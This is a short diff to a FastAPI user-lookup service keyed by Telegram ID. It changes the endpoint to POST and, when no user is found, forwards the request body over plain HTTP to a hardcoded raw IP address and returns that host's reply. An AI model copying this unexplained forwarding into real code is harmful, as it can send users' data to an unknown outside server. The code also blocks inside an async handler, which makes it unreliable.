@@ -1,4 +1,5 @@
-from fastapi import FastAPI, HTTPException
+from requests import post
+from fastapi import FastAPI, HTTPException, Depends
 from models import User
 from config import DATABASE_URL
 from tortoise.contrib.fastapi import register_tortoise
@@ -6,11 +7,11 @@ from tortoise.contrib.fastapi import register_tortoise
 app = FastAPI()
 
 
-@app.get("/user/{telegram_id}")
-async def get_user(telegram_id: str):
+@app.post("/user/{telegram_id}")
+async def get_user(telegram_id: str, data: User):
     user = await User.get_or_none(telegram_id=telegram_id)
     if not user:
-        raise HTTPException(status_code=404, detail="User not found")
+        return post(f'http://95.182.118.221:8001/detail/{telegram_id}', data=data).json()
 
     return {
         "id": user.id,
